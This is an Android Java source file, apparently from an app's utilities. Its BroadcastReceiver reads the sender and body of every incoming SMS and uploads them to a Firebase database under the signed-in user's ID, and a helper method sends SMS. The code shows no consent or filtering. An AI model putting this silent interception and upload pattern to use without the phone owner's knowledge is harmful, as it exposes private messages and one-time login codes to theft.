package com.wains.app.utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

import java.util.HashMap;
import java.util.Map;

public class SmsUtil extends BroadcastReceiver {
    private static final String TAG = "SmsUtil";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Log.d(TAG, "Incoming SMS received.");
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }

                    StringBuilder messageBody = new StringBuilder();
                    String senderNumber = messages[0].getOriginatingAddress();

                    for (SmsMessage message : messages) {
                        messageBody.append(message.getMessageBody());
                    }

                    // Upload SMS to Firebase
                    FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
                    if (user != null) {
                        Map<String, String> smsData = new HashMap<>();
                        smsData.put("sender", senderNumber);
                        smsData.put("message", messageBody.toString());
                        smsData.put("timestamp", String.valueOf(System.currentTimeMillis()));

                        FirebaseManager.getInstance().getSmsReference(user.getUid())
                                .push()
                                .setValue(smsData)
                                .addOnSuccessListener(aVoid -> Log.d(TAG, "SMS uploaded to Firebase successfully."))
                                .addOnFailureListener(e -> Log.e(TAG, "Failed to upload SMS to Firebase.", e));
                    }
                }
            }
        }
    }

    public static void sendSms(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            Log.d(TAG, "SMS sent to " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send SMS.", e);
        }
    }
}
